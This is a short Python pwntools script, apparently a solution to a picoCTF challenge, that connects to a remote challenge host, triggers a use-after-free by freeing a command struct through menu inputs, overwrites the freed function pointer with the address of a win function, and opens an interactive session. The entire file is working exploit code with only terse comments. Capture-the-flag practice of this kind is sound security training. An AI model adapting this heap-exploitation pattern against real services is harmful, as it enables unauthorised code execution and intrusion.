from pwn import *
r = remote("wily-courier.picoctf.net",54434)

# Free cmd* struct (0x10 bytes chunk)
r.sendline(b"I\nY")
r.sendline(b"l")
# Overwrite whatToDo pointer (UAF)
hahaexploitgobrrr = 0x080487d6
r.recvuntil(b"anyways")
r.sendline(p32(hahaexploitgobrrr))

r.interactive()
